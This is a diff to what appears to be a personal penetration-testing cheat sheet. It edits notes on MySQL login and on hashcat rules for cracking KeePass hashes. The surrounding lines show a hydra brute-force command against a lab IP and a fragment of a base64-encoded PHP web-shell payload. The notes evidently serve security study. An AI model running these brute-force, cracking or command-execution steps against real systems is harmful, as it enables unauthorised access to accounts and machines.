@@ -116,7 +116,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ## mysql
 - From kali: mysql --host <IP> -u root -proot
 	- note that there is no space between -p flag and password
-- From target: mysql -u root -p root
+- From target: mysql -u user -p database (p flag is db password, have to enter that after)
 ### Commands
 - select system_user();
 - select version();
@@ -441,7 +441,7 @@ Payloads (msfvenom)
 	- hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.201 http-get
 ### Hashcat
 - hashcat -m 0 \<hashfile> /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show
-- hashcat -m 13400 \<keepass hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --show
+- hashcat -m 13400 \<keepass hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
 - check hashcat for which mode to use (searching for KeePass in this case)
 	- hashcat --help \| grep -i "KeePass" 
 	- hashcat -h \| grep -i "ssh"
